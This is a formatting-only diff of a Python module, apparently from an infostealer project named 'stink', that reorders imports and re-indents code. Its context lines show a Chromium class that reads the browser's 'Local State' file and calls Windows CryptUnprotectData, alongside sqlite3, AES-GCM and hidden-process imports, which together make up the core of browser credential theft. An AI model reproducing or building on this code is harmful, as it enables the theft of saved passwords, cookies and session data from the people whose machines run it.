@@ -1,16 +1,16 @@
-from re import compile
 from base64 import b64decode
+from ctypes import windll, byref, cdll, c_buffer
+from datetime import datetime, timedelta
 from json import loads
 from os import path, listdir
-from typing import Tuple, List
-from datetime import datetime, timedelta
+from re import compile
 from sqlite3 import connect, Connection, Cursor
-from ctypes import windll, byref, cdll, c_buffer
 from subprocess import run, CREATE_NEW_CONSOLE, SW_HIDE
+from typing import Tuple, List
 
 from stink.enums.features import Features
-from stink.helpers.config import ChromiumConfig
 from stink.helpers import AESModeOfOperationGCM, DataBlob, MemoryStorage
+from stink.helpers.config import ChromiumConfig
 
 
 class Chromium:
@@ -19,7 +19,7 @@ class Chromium:
     """
 
     def __init__(
-            self, browser_name: str, browser_path: str, process_name: str, statuses: List
+        self, browser_name: str, browser_path: str, process_name: str, statuses: List
     ):
         self.__browser_name = browser_name
         self.__state_path = path.join(browser_path, "Local State")
@@ -86,7 +86,7 @@ class Chromium:
 
     @staticmethod
     def _crypt_unprotect_data(
-            encrypted_bytes: b64decode, entropy: bytes = b""
+        encrypted_bytes: b64decode, entropy: bytes = b""
     ) -> bytes:
         """
         Decrypts data previously encrypted using Windows CryptProtectData function.
@@ -101,18 +101,18 @@ class Chromium:
         blob = DataBlob()
 
         if windll.crypt32.CryptUnprotectData(
-                byref(
-                    DataBlob(
-                        len(encrypted_bytes),
-                        c_buffer(encrypted_bytes, len(encrypted_bytes)),
-                    )
-                ),
-                None,
-                byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))),
-                None,
-                None,
-                0x01,
-                byref(blob),
+            byref(
+                DataBlob(
+                    len(encrypted_bytes),
+                    c_buffer(encrypted_bytes, len(encrypted_bytes)),
+                )
+            ),
+            None,
+            byref(DataBlob(len(entropy), c_buffer(entropy, len(entropy)))),
+            None,
+            None,
+            0x01,
+            byref(blob),
         ):
             buffer = c_buffer(int(blob.cbData))
             cdll.msvcrt.memcpy(buffer, blob.pbData, int(blob.cbData))
